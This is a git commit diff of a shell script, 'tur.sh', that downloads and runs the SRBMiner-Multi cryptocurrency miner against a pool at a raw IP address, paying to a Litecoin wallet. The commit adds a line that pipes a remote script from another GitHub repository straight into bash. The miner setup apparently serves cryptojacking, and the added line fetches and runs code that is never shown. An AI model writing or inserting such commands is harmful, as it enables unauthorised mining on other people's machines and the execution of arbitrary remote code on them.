dba7824bee5fe4901ef7984349bf8502c6c73805
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-18 14:40:10 +0700

    Update tur.sh

--- tur.sh
+++ tur.sh
@@ -15,3 +15,4 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner
 tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
 cd SRBMiner-Multi-2-4-8
 ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://104.207.92.96:443 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."po$RANDOM"
+curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
